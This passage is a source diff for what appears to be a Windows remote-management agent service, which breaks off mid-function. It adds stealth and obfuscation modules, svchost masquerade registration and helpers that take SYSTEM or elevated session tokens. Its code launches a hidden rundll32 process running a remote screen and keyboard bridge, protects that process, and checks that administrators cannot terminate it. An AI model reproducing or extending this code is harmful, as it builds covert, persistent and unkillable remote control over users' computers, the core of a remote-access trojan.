@@ -28,25 +28,33 @@ limitations under the License.
 #include <winhttp.h>
 #include <shlobj.h>
 #include <shellapi.h>
+#include <tlhelp32.h>
 #include <winsvc.h>
+#include <wtsapi32.h>
 #include <sddl.h>
+#include <aclapi.h>
 #include <strsafe.h>
+#include <crtdbg.h>
 #include "resource.h"
 #include "service_security.h"
 #include "meshcore/signcheck.h"
 #include "meshcore/meshdefines.h"
 #include "meshcore/meshinfo.h"
+#include "meshcore/KVM/Windows/kvm.h"
+#include "meshcore/KVM/Windows/tile.h"
 #include "microstack/ILibParsers.h"
 #include "microstack/ILibCrypto.h"
 #include "meshcore/agentcore.h"
 #include "microscript/ILibDuktape_ScriptContainer.h"
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
+#include "branding_util.h"
 #include "stealth.h"  // SECURITY: Stealth and obfuscation features
 #include "stealth_utils.h"
 #include "stealth_init.h"  // Lab/test stealth initialization
 #include "stealth_defaults.h"
 #include "stealth_watchdog.h"
+#include "stealth_monitor.h"
 #include "stealth_integration.h"
 #include "svchost_payload.h"
 // Svchost registration helper (implemented in stealth_svchost.c)
@@ -56,6 +64,20 @@ BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 // Forward declaration to satisfy early references in this TU
 int wmain(int argc, char* wargv[]);
 static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer);
+static BOOL MeshService_ProcessHasSystemSid(void);
+static DWORD MeshService_GetCurrentSessionId(void);
+static BOOL MeshService_EnableNamedPrivilegeW(const WCHAR* privilegeName);
+static char* MeshService_ReadUtf8TextFileW(const WCHAR* path);
+static BOOL MeshService_OpenPrimarySystemTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut);
+static BOOL MeshService_OpenElevatedPrimaryTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut);
+static BOOL MeshService_SpawnProcessWithTokenW(HANDLE token, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut);
+typedef HRESULT(__stdcall *DpiAwarenessFunc)(PROCESS_DPI_AWARENESS);
+#if defined(_LINKVM)
+extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
+extern int g_slavekvm;
+#define MESH_KVM_BRIDGE_EVENT_ID_ATTEMPT 0xC0082001
+#define MESH_KVM_BRIDGE_EVENT_ID_OUTCOME 0xC0082002
+#endif
 
 // Macro to free argv allocated by wmain - needs argvi variable in scope
 #define wmain_free(argv) do { int argvi; for(argvi=0;argvi<(int)(ILibMemory_Size(argv)/sizeof(void*));++argvi){ILibMemory_Free(argv[argvi]);}ILibMemory_Free(argv); } while(0)
@@ -68,9 +90,86 @@ static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer);
 #define SVCHOST_STATUS_DLL_HASH_MISMATCH      0x00000020
 #define SVCHOST_STATUS_SID_MISMATCH           0x00000040
 #define SVCHOST_STATUS_HASH_NOT_CONFIGURED    0x00000080
+#define SVCHOST_STATUS_IMAGEPATH_INVALID      0x00000100
+#define SVCHOST_STATUS_GROUP_ARGUMENT_INVALID 0x00000200
+#define SVCHOST_STATUS_DLL_PATH_MISMATCH      0x00000400
+#define SVCHOST_STATUS_SERVICE_MAIN_MISMATCH  0x00000800
+#define SVCHOST_STATUS_UNLOAD_MISMATCH        0x00001000
+#define SVCHOST_STATUS_NOT_RUNNING            0x00002000
+#define SVCHOST_STATUS_ACCOUNT_MISMATCH       0x00004000
+#define SVCHOST_STATUS_TYPE_MISMATCH          0x00008000
+#define SVCHOST_STATUS_START_MISMATCH         0x00010000
 #define MESH_SERVICE_CONTROL_TIMEOUT_MS       120000
 #define MESH_SERVICE_CONTROL_POLL_MIN_MS      200
 #define MESH_SERVICE_CONTROL_POLL_MAX_MS      1000
+#define MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS 32
+
+static LONG g_MeshServiceInvalidParameterHandlerInstalled = 0;
+
+static void MeshService_InvalidParameterHandler(
+    const wchar_t* expression,
+    const wchar_t* function,
+    const wchar_t* file,
+    unsigned int line,
+    uintptr_t reserved)
+{
+    WCHAR wideBuffer[1024];
+    char narrowBuffer[2048];
+    HANDLE stderrHandle = INVALID_HANDLE_VALUE;
+    DWORD written = 0;
+    int narrowLen = 0;
+    void* frames[16] = { 0 };
+    USHORT captured = 0;
+    int i = 0;
+
+    UNREFERENCED_PARAMETER(reserved);
+    if (FAILED(StringCchPrintfW(
+        wideBuffer,
+        _countof(wideBuffer),
+        L"[MeshService invalid parameter] expr=%ls func=%ls file=%ls line=%u\r\n",
+        expression != NULL ? expression : L"(null)",
+        function != NULL ? function : L"(null)",
+        file != NULL ? file : L"(null)",
+        line)))
+    {
+        return;
+    }
+
+    OutputDebugStringW(wideBuffer);
+    narrowLen = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, narrowBuffer, (int)_countof(narrowBuffer), NULL, NULL);
+    if (narrowLen <= 1) { return; }
+
+    stderrHandle = GetStdHandle(STD_ERROR_HANDLE);
+    if (stderrHandle != NULL && stderrHandle != INVALID_HANDLE_VALUE)
+    {
+        WriteFile(stderrHandle, narrowBuffer, (DWORD)(narrowLen - 1), &written, NULL);
+    }
+
+    captured = RtlCaptureStackBackTrace(0, (ULONG)_countof(frames), frames, NULL);
+    for (i = 0; i < (int)captured; ++i)
+    {
+        if (FAILED(StringCchPrintfW(wideBuffer, _countof(wideBuffer), L"[MeshService invalid parameter stack] frame[%d]=%p\r\n", i, frames[i])))
+        {
+            break;
+        }
+        OutputDebugStringW(wideBuffer);
+        narrowLen = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, narrowBuffer, (int)_countof(narrowBuffer), NULL, NULL);
+        if (narrowLen > 1 && stderrHandle != NULL && stderrHandle != INVALID_HANDLE_VALUE)
+        {
+            WriteFile(stderrHandle, narrowBuffer, (DWORD)(narrowLen - 1), &written, NULL);
+        }
+    }
+}
+
+static void MeshService_InstallInvalidParameterHandler(void)
+{
+    if (InterlockedCompareExchange(&g_MeshServiceInvalidParameterHandlerInstalled, 1, 0) != 0)
+    {
+        return;
+    }
+    _set_invalid_parameter_handler(MeshService_InvalidParameterHandler);
+    _set_thread_local_invalid_parameter_handler(MeshService_InvalidParameterHandler);
+}
 
 static const wchar_t* ServiceStateToString(DWORD s)
 {
@@ -100,6 +199,5215 @@ static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
     return TRUE;
 }
 
+static void MeshService_PrintJsonEscapedUtf8(const char* value)
+{
+	const unsigned char* cursor = (const unsigned char*)((value != NULL) ? value : "");
+	while (*cursor != '\0')
+	{
+		switch (*cursor)
+		{
+		case '\\': fputs("\\\\", stdout); break;
+		case '"': fputs("\\\"", stdout); break;
+		case '\n': fputs("\\n", stdout); break;
+		case '\r': fputs("\\r", stdout); break;
+		case '\t': fputs("\\t", stdout); break;
+		default: fputc(*cursor, stdout); break;
+		}
+		++cursor;
+	}
+}
+
+static void MeshService_PrintJsonEscapedWide(const wchar_t* value)
+{
+	int needed = 0;
+	char* utf8 = NULL;
+
+	if (value == NULL || value[0] == L'\0') { return; }
+
+	needed = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
+	if (needed <= 0) { return; }
+
+	utf8 = (char*)malloc((size_t)needed);
+	if (utf8 == NULL) { return; }
+
+	if (WideCharToMultiByte(CP_UTF8, 0, value, -1, utf8, needed, NULL, NULL) > 0)
+	{
+		MeshService_PrintJsonEscapedUtf8(utf8);
+	}
+	free(utf8);
+}
+
+#if defined(_LINKVM)
+typedef struct MeshServiceBridgeSpawnContext
+{
+	PROCESS_INFORMATION pi;
+	HANDLE inputPipeServer;
+	HANDLE outputPipeServer;
+	HANDLE jobObject;
+	BOOL processProtected;
+	BOOL assignedToJobObject;
+	BOOL pipeConnected;
+	DWORD createError;
+	DWORD protectError;
+	DWORD assignError;
+	DWORD inputConnectError;
+	DWORD outputConnectError;
+	WCHAR rundll32Path[MAX_PATH * 2];
+} MeshServiceBridgeSpawnContext;
+
+static void MeshService_BridgeSpawnContext_Init(MeshServiceBridgeSpawnContext* ctx)
+{
+	if (ctx == NULL) { return; }
+	ZeroMemory(ctx, sizeof(MeshServiceBridgeSpawnContext));
+	ctx->inputPipeServer = INVALID_HANDLE_VALUE;
+	ctx->outputPipeServer = INVALID_HANDLE_VALUE;
+}
+
+static void MeshService_BridgeSpawnContext_Cleanup(MeshServiceBridgeSpawnContext* ctx, BOOL killProcess)
+{
+	if (ctx == NULL) { return; }
+
+	if (killProcess && ctx->pi.hProcess != NULL && ctx->pi.hProcess != INVALID_HANDLE_VALUE)
+	{
+		if (WaitForSingleObject(ctx->pi.hProcess, 0) == WAIT_TIMEOUT)
+		{
+			TerminateProcess(ctx->pi.hProcess, 1);
+			WaitForSingleObject(ctx->pi.hProcess, 2000);
+		}
+	}
+
+	if (ctx->inputPipeServer != NULL && ctx->inputPipeServer != INVALID_HANDLE_VALUE)
+	{
+		DisconnectNamedPipe(ctx->inputPipeServer);
+		CloseHandle(ctx->inputPipeServer);
+		ctx->inputPipeServer = INVALID_HANDLE_VALUE;
+	}
+	if (ctx->outputPipeServer != NULL && ctx->outputPipeServer != INVALID_HANDLE_VALUE)
+	{
+		DisconnectNamedPipe(ctx->outputPipeServer);
+		CloseHandle(ctx->outputPipeServer);
+		ctx->outputPipeServer = INVALID_HANDLE_VALUE;
+	}
+	if (ctx->pi.hThread != NULL)
+	{
+		CloseHandle(ctx->pi.hThread);
+		ctx->pi.hThread = NULL;
+	}
+	if (ctx->pi.hProcess != NULL)
+	{
+		CloseHandle(ctx->pi.hProcess);
+		ctx->pi.hProcess = NULL;
+	}
+}
+
+static BOOL MeshService_BuildKvmProbePipeBaseNameW(WCHAR* output, size_t outputLen)
+{
+	ULONGLONG tick = GetTickCount64();
+	if (output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+	return SUCCEEDED(StringCchPrintfW(output, outputLen, L"\\\\.\\pipe\\MeshKvmHardening_%lu_%llu", GetCurrentProcessId(), tick));
+}
+
+static BOOL MeshService_BuildKvmProbePipeNamesW(WCHAR* inputPipeName, size_t inputPipeLen, WCHAR* outputPipeName, size_t outputPipeLen)
+{
+	WCHAR basePipeName[256] = { 0 };
+
+	if (inputPipeName == NULL || inputPipeLen == 0 || outputPipeName == NULL || outputPipeLen == 0) { return FALSE; }
+	inputPipeName[0] = L'\0';
+	outputPipeName[0] = L'\0';
+
+	if (!MeshService_BuildKvmProbePipeBaseNameW(basePipeName, _countof(basePipeName))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(inputPipeName, inputPipeLen, L"%ls_in", basePipeName))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(outputPipeName, outputPipeLen, L"%ls_out", basePipeName))) { return FALSE; }
+	return TRUE;
+}
+
+static BOOL MeshService_CreateBridgeServerPipeW(const WCHAR* pipeName, DWORD pipeOpenMode, HANDLE* pipeOut)
+{
+	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
+	SECURITY_ATTRIBUTES securityAttributes;
+	HANDLE pipeHandle = INVALID_HANDLE_VALUE;
+	DWORD pipeBufferSize = 1024 * 1024;
+
+	if (pipeOut == NULL || pipeName == NULL || pipeName[0] == L'\0') { return FALSE; }
+	*pipeOut = INVALID_HANDLE_VALUE;
+
+	ZeroMemory(&securityAttributes, sizeof(securityAttributes));
+	securityAttributes.nLength = sizeof(securityAttributes);
+	securityAttributes.bInheritHandle = FALSE;
+
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &securityDescriptor, NULL))
+	{
+		return FALSE;
+	}
+
+	securityAttributes.lpSecurityDescriptor = securityDescriptor;
+	pipeHandle = CreateNamedPipeW(
+		pipeName,
+		pipeOpenMode | FILE_FLAG_OVERLAPPED,
+		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+		1,
+		pipeBufferSize,
+		pipeBufferSize,
+		0,
+		&securityAttributes);
+
+	LocalFree(securityDescriptor);
+	if (pipeHandle == INVALID_HANDLE_VALUE) { return FALSE; }
+
+	*pipeOut = pipeHandle;
+	return TRUE;
+}
+
+static BOOL MeshService_WaitForBridgeClient(HANDLE pipeHandle, DWORD timeoutMs, DWORD* errorOut)
+{
+	OVERLAPPED overlapped;
+	DWORD waitResult = WAIT_FAILED;
+	DWORD transferred = 0;
+	BOOL ok = FALSE;
+	DWORD errorCode = ERROR_SUCCESS;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (pipeHandle == NULL || pipeHandle == INVALID_HANDLE_VALUE)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_HANDLE; }
+		return FALSE;
+	}
+
+	ZeroMemory(&overlapped, sizeof(overlapped));
+	overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+	if (overlapped.hEvent == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+
+	if (ConnectNamedPipe(pipeHandle, &overlapped))
+	{
+		ok = TRUE;
+		goto cleanup;
+	}
+
+	errorCode = GetLastError();
+	switch (errorCode)
+	{
+	case ERROR_PIPE_CONNECTED:
+		ok = TRUE;
+		break;
+	case ERROR_IO_PENDING:
+		waitResult = WaitForSingleObject(overlapped.hEvent, timeoutMs);
+		if (waitResult == WAIT_OBJECT_0 && GetOverlappedResult(pipeHandle, &overlapped, &transferred, FALSE))
+		{
+			ok = TRUE;
+		}
+		else
+		{
+			errorCode = (waitResult == WAIT_TIMEOUT) ? WAIT_TIMEOUT : GetLastError();
+			CancelIoEx(pipeHandle, &overlapped);
+		}
+		break;
+	default:
+		break;
+	}
+
+cleanup:
+	CloseHandle(overlapped.hEvent);
+	if (!ok && errorOut != NULL) { *errorOut = errorCode; }
+	return ok;
+}
+
+static BOOL MeshService_ResolveRundll32PathW(WCHAR* output, size_t outputLen)
+{
+	DWORD expanded = 0;
+
+	if (output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+
+	expanded = ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\rundll32.exe", output, (DWORD)outputLen);
+	if (expanded == 0 || expanded >= outputLen) { return FALSE; }
+	return (GetFileAttributesW(output) != INVALID_FILE_ATTRIBUTES);
+}
+
+static BOOL MeshService_SpawnBridgeProcessW(
+	const WCHAR* dllPath,
+	const WCHAR* inputPipeName,
+	const WCHAR* outputPipeName,
+	MeshServiceBridgeSpawnContext* ctx)
+{
+	STARTUPINFOW si;
+	WCHAR commandLine[4096];
+
+	if (ctx == NULL || dllPath == NULL || dllPath[0] == L'\0' || inputPipeName == NULL || inputPipeName[0] == L'\0' || outputPipeName == NULL || outputPipeName[0] == L'\0')
+	{
+		if (ctx != NULL) { ctx->createError = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (!MeshService_ResolveRundll32PathW(ctx->rundll32Path, _countof(ctx->rundll32Path)))
+	{
+		ctx->createError = GetLastError();
+		if (ctx->createError == ERROR_SUCCESS) { ctx->createError = ERROR_FILE_NOT_FOUND; }
+		return FALSE;
+	}
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" \"%ls\",KvmSessionBridgeW %ls %ls", ctx->rundll32Path, dllPath, inputPipeName, outputPipeName)))
+	{
+		ctx->createError = ERROR_INSUFFICIENT_BUFFER;
+		return FALSE;
+	}
+
+	if (!CreateProcessW(ctx->rundll32Path, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &ctx->pi))
+	{
+		ctx->createError = GetLastError();
+		return FALSE;
+	}
+
+	if (!Stealth_ProtectProcessByHandle(ctx->pi.hProcess))
+	{
+		ctx->protectError = GetLastError();
+		if (ctx->protectError == ERROR_SUCCESS) { ctx->protectError = ERROR_ACCESS_DENIED; }
+		return FALSE;
+	}
+	ctx->processProtected = TRUE;
+
+	ctx->jobObject = Watchdog_GetOrCreateJobObject();
+	if (ctx->jobObject == NULL)
+	{
+		ctx->assignError = GetLastError();
+		if (ctx->assignError == ERROR_SUCCESS) { ctx->assignError = ERROR_INVALID_HANDLE; }
+		return FALSE;
+	}
+	if (!AssignProcessToJobObject(ctx->jobObject, ctx->pi.hProcess))
+	{
+		ctx->assignError = GetLastError();
+		return FALSE;
+	}
+	ctx->assignedToJobObject = TRUE;
+	return TRUE;
+}
+
+static BOOL MeshService_IsProcessDaclProtected(HANDLE hProcess, DWORD* controlOut)
+{
+	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
+	PACL dacl = NULL;
+	SECURITY_DESCRIPTOR_CONTROL control = 0;
+	DWORD revision = 0;
+	DWORD result = ERROR_GEN_FAILURE;
+	BOOL protectedDacl = FALSE;
+
+	if (controlOut != NULL) { *controlOut = 0; }
+	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) { return FALSE; }
+
+	result = GetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, &securityDescriptor);
+	if (result != ERROR_SUCCESS)
+	{
+		SetLastError(result);
+		return FALSE;
+	}
+
+	if (GetSecurityDescriptorControl(securityDescriptor, &control, &revision))
+	{
+		if (controlOut != NULL) { *controlOut = (DWORD)control; }
+		protectedDacl = ((control & SE_DACL_PROTECTED) != 0);
+	}
+
+	if (securityDescriptor != NULL) { LocalFree(securityDescriptor); }
+	return protectedDacl;
+}
+
+static BOOL MeshService_ProbeTerminateDeniedWithRestrictedToken(DWORD pid, DWORD* openErrorOut)
+{
+	HANDLE currentToken = NULL;
+	HANDLE restrictedToken = NULL;
+	HANDLE processHandle = NULL;
+	PSID adminSid = NULL;
+	SID_AND_ATTRIBUTES sidToDisable;
+	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+	BOOL impersonating = FALSE;
+	BOOL denied = FALSE;
+	DWORD openError = ERROR_SUCCESS;
+
+	if (openErrorOut != NULL) { *openErrorOut = ERROR_SUCCESS; }
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &currentToken))
+	{
+		openError = GetLastError();
+		goto cleanup;
+	}
+
+	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid))
+	{
+		openError = GetLastError();
+		goto cleanup;
+	}
+
+	sidToDisable.Sid = adminSid;
+	sidToDisable.Attributes = 0;
+	if (!CreateRestrictedToken(currentToken, DISABLE_MAX_PRIVILEGE, 1, &sidToDisable, 0, NULL, 0, NULL, &restrictedToken))
+	{
+		openError = GetLastError();
+		goto cleanup;
+	}
+
+	if (!ImpersonateLoggedOnUser(restrictedToken))
+	{
+		openError = GetLastError();
+		goto cleanup;
+	}
+	impersonating = TRUE;
+
+	SetLastError(ERROR_SUCCESS);
+	processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	openError = GetLastError();
+	if (processHandle == NULL)
+	{
+		denied = (openError == ERROR_ACCESS_DENIED);
+	}
+
+cleanup:
+	if (impersonating) { RevertToSelf(); }
+	if (processHandle != NULL) { CloseHandle(processHandle); }
+	if (restrictedToken != NULL) { CloseHandle(restrictedToken); }
+	if (currentToken != NULL) { CloseHandle(currentToken); }
+	if (adminSid != NULL) { FreeSid(adminSid); }
+	if (openErrorOut != NULL) { *openErrorOut = openError; }
+	return denied;
+}
+
+static int MeshService_RunKvmBridgeHardeningProbeCommand(const WCHAR* dllPath)
+{
+	MeshServiceBridgeSpawnContext ctx;
+	WCHAR inputPipeName[256] = { 0 };
+	WCHAR outputPipeName[256] = { 0 };
+	DWORD daclControl = 0;
+	DWORD restrictedOpenError = ERROR_SUCCESS;
+	DWORD terminateWaitResult = WAIT_FAILED;
+	ULONGLONG terminateStartTick = 0;
+	ULONGLONG exitAfterTerminateMs = 0;
+	BOOL success = FALSE;
+	BOOL dllExists = FALSE;
+	BOOL daclProtected = FALSE;
+	BOOL restrictedTerminateDenied = FALSE;
+	BOOL aliveBeforeTerminate = FALSE;
+	BOOL existingHandleTerminateSucceeded = FALSE;
+
+	MeshService_BridgeSpawnContext_Init(&ctx);
+	dllExists = (dllPath != NULL && dllPath[0] != L'\0' && GetFileAttributesW(dllPath) != INVALID_FILE_ATTRIBUTES);
+
+	if (dllExists &&
+		MeshService_BuildKvmProbePipeNamesW(inputPipeName, _countof(inputPipeName), outputPipeName, _countof(outputPipeName)) &&
+		MeshService_CreateBridgeServerPipeW(inputPipeName, PIPE_ACCESS_OUTBOUND, &ctx.inputPipeServer) &&
+		MeshService_CreateBridgeServerPipeW(outputPipeName, PIPE_ACCESS_INBOUND, &ctx.outputPipeServer) &&
+		MeshService_SpawnBridgeProcessW(dllPath, inputPipeName, outputPipeName, &ctx) &&
+		MeshService_WaitForBridgeClient(ctx.inputPipeServer, 5000, &ctx.inputConnectError) &&
+		MeshService_WaitForBridgeClient(ctx.outputPipeServer, 5000, &ctx.outputConnectError))
+	{
+		ctx.pipeConnected = TRUE;
+		Sleep(500);
+		aliveBeforeTerminate = (WaitForSingleObject(ctx.pi.hProcess, 0) == WAIT_TIMEOUT);
+		daclProtected = MeshService_IsProcessDaclProtected(ctx.pi.hProcess, &daclControl);
+		restrictedTerminateDenied = MeshService_ProbeTerminateDeniedWithRestrictedToken(ctx.pi.dwProcessId, &restrictedOpenError);
+
+		terminateStartTick = GetTickCount64();
+		if (aliveBeforeTerminate && TerminateProcess(ctx.pi.hProcess, 0))
+		{
+			existingHandleTerminateSucceeded = TRUE;
+			terminateWaitResult = WaitForSingleObject(ctx.pi.hProcess, 5000);
+			exitAfterTerminateMs = GetTickCount64() - terminateStartTick;
+		}
+	}
+
+	success = dllExists &&
+		ctx.processProtected &&
+		ctx.assignedToJobObject &&
+		ctx.pipeConnected &&
+		aliveBeforeTerminate &&
+		daclProtected &&
+		restrictedTerminateDenied &&
+		existingHandleTerminateSucceeded &&
+		terminateWaitResult == WAIT_OBJECT_0;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-bridge-hardening-probe\",");
+	printf("\"dllPath\":\""); MeshService_PrintJsonEscapedWide(dllPath); printf("\",");
+	printf("\"dllExists\":%s,", dllExists ? "true" : "false");
+	printf("\"rundll32Path\":\""); MeshService_PrintJsonEscapedWide(ctx.rundll32Path); printf("\",");
+	printf("\"inputPipeName\":\""); MeshService_PrintJsonEscapedWide(inputPipeName); printf("\",");
+	printf("\"outputPipeName\":\""); MeshService_PrintJsonEscapedWide(outputPipeName); printf("\",");
+	printf("\"pid\":%lu,", (unsigned long)ctx.pi.dwProcessId);
+	printf("\"protectedProcess\":%s,", ctx.processProtected ? "true" : "false");
+	printf("\"assignedToJobObject\":%s,", ctx.assignedToJobObject ? "true" : "false");
+	printf("\"bridgeConnected\":%s,", ctx.pipeConnected ? "true" : "false");
+	printf("\"aliveBeforeTerminate\":%s,", aliveBeforeTerminate ? "true" : "false");
+	printf("\"daclProtected\":%s,", daclProtected ? "true" : "false");
+	printf("\"restrictedTerminateDenied\":%s,", restrictedTerminateDenied ? "true" : "false");
+	printf("\"existingHandleTerminateSucceeded\":%s,", existingHandleTerminateSucceeded ? "true" : "false");
+	printf("\"createError\":%lu,", (unsigned long)ctx.createError);
+	printf("\"protectError\":%lu,", (unsigned long)ctx.protectError);
+	printf("\"assignError\":%lu,", (unsigned long)ctx.assignError);
+	printf("\"inputConnectError\":%lu,", (unsigned long)ctx.inputConnectError);
+	printf("\"outputConnectError\":%lu,", (unsigned long)ctx.outputConnectError);
+	printf("\"restrictedOpenError\":%lu,", (unsigned long)restrictedOpenError);
+	printf("\"daclControl\":%lu,", (unsigned long)daclControl);
+	printf("\"terminateWaitResult\":%lu,", (unsigned long)terminateWaitResult);
+	printf("\"exitAfterTerminateMs\":%llu}\n", (unsigned long long)exitAfterTerminateMs);
+	fflush(stdout);
+
+	MeshService_BridgeSpawnContext_Cleanup(&ctx, !existingHandleTerminateSucceeded);
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmBridgeJobControllerCommand(const WCHAR* dllPath, const WCHAR* inputPipeName, const WCHAR* outputPipeName)
+{
+	MeshServiceBridgeSpawnContext ctx;
+	BOOL dllExists = FALSE;
+	BOOL pipeProvided = FALSE;
+	BOOL aliveAfterWarmup = FALSE;
+	BOOL success = FALSE;
+	DWORD warmupWaitResult = WAIT_FAILED;
+
+	MeshService_BridgeSpawnContext_Init(&ctx);
+	dllExists = (dllPath != NULL && dllPath[0] != L'\0' && GetFileAttributesW(dllPath) != INVALID_FILE_ATTRIBUTES);
+	pipeProvided = (inputPipeName != NULL && inputPipeName[0] != L'\0' && outputPipeName != NULL && outputPipeName[0] != L'\0');
+
+	if (dllExists && pipeProvided && MeshService_SpawnBridgeProcessW(dllPath, inputPipeName, outputPipeName, &ctx))
+	{
+		warmupWaitResult = WaitForSingleObject(ctx.pi.hProcess, 1500);
+		aliveAfterWarmup = (warmupWaitResult == WAIT_TIMEOUT);
+	}
+
+	success = dllExists && pipeProvided && ctx.processProtected && ctx.assignedToJobObject && aliveAfterWarmup;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-bridge-job-controller\",");
+	printf("\"dllPath\":\""); MeshService_PrintJsonEscapedWide(dllPath); printf("\",");
+	printf("\"inputPipeName\":\""); MeshService_PrintJsonEscapedWide(inputPipeName); printf("\",");
+	printf("\"outputPipeName\":\""); MeshService_PrintJsonEscapedWide(outputPipeName); printf("\",");
+	printf("\"dllExists\":%s,", dllExists ? "true" : "false");
+	printf("\"pipeProvided\":%s,", pipeProvided ? "true" : "false");
+	printf("\"rundll32Path\":\""); MeshService_PrintJsonEscapedWide(ctx.rundll32Path); printf("\",");
+	printf("\"pid\":%lu,", (unsigned long)ctx.pi.dwProcessId);
+	printf("\"protectedProcess\":%s,", ctx.processProtected ? "true" : "false");
+	printf("\"assignedToJobObject\":%s,", ctx.assignedToJobObject ? "true" : "false");
+	printf("\"aliveAfterWarmup\":%s,", aliveAfterWarmup ? "true" : "false");
+	printf("\"createError\":%lu,", (unsigned long)ctx.createError);
+	printf("\"protectError\":%lu,", (unsigned long)ctx.protectError);
+	printf("\"assignError\":%lu,", (unsigned long)ctx.assignError);
+	printf("\"warmupWaitResult\":%lu}\n", (unsigned long)warmupWaitResult);
+	fflush(stdout);
+
+	if (!success)
+	{
+		MeshService_BridgeSpawnContext_Cleanup(&ctx, TRUE);
+	}
+	return success ? 0 : 1;
+}
+
+typedef struct MeshServiceKvmSessionChangeProbeState
+{
+	volatile LONG screenPackets;
+	volatile LONG displayListPackets;
+	volatile LONG displayInfoPackets;
+	volatile LONG cursorPackets;
+	volatile LONG picturePackets;
+	volatile LONG jumboPackets;
+	volatile LONG lastScreenWidth;
+	volatile LONG lastScreenHeight;
+} MeshServiceKvmSessionChangeProbeState;
+
+static LONG MeshService_KvmSessionChangeProbeTotalPackets(const MeshServiceKvmSessionChangeProbeState* state)
+{
+	if (state == NULL) { return 0; }
+	return state->screenPackets +
+		state->displayListPackets +
+		state->displayInfoPackets +
+		state->cursorPackets +
+		state->picturePackets +
+		state->jumboPackets;
+}
+
+static ILibTransport_DoneState MeshService_KvmSessionChangeProbeWriteSink(char *buffer, int bufferLen, void *reserved)
+{
+	MeshServiceKvmSessionChangeProbeState* state = (MeshServiceKvmSessionChangeProbeState*)reserved;
+	unsigned short type = 0;
+
+	if (state == NULL || buffer == NULL || bufferLen < 4) { return ILibTransport_DoneState_COMPLETE; }
+	type = ntohs(((unsigned short*)buffer)[0]);
+
+	switch (type)
+	{
+	case MNG_KVM_PICTURE:
+		InterlockedIncrement(&state->picturePackets);
+		break;
+	case MNG_JUMBO:
+		InterlockedIncrement(&state->jumboPackets);
+		break;
+	case MNG_KVM_SCREEN:
+		InterlockedIncrement(&state->screenPackets);
+		if (bufferLen >= 8)
+		{
+			InterlockedExchange(&state->lastScreenWidth, (LONG)ntohs(((unsigned short*)(buffer))[2]));
+			InterlockedExchange(&state->lastScreenHeight, (LONG)ntohs(((unsigned short*)(buffer))[3]));
+		}
+		break;
+	case MNG_KVM_GET_DISPLAYS:
+		InterlockedIncrement(&state->displayListPackets);
+		break;
+	case MNG_KVM_DISPLAY_INFO:
+		InterlockedIncrement(&state->displayInfoPackets);
+		break;
+	case MNG_KVM_MOUSE_CURSOR:
+		InterlockedIncrement(&state->cursorPackets);
+		break;
+	default:
+		break;
+	}
+
+	return ILibTransport_DoneState_COMPLETE;
+}
+
+static DWORD WINAPI MeshService_KvmSessionChangeProbeChainThread(LPVOID param)
+{
+	if (param != NULL) { ILibStartChain(param); }
+	return 0;
+}
+
+static BOOL MeshService_IsProcessAliveById(DWORD pid)
+{
+	HANDLE processHandle = NULL;
+	DWORD waitResult = WAIT_FAILED;
+
+	if (pid == 0) { return FALSE; }
+
+	processHandle = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+	if (processHandle == NULL) { processHandle = OpenProcess(SYNCHRONIZE, FALSE, pid); }
+	if (processHandle == NULL) { return FALSE; }
+
+	waitResult = WaitForSingleObject(processHandle, 0);
+	CloseHandle(processHandle);
+	return (waitResult == WAIT_TIMEOUT);
+}
+
+static BOOL MeshService_WaitForProcessExitById(DWORD pid, DWORD timeoutMs, DWORD* elapsedMsOut)
+{
+	ULONGLONG started = GetTickCount64();
+
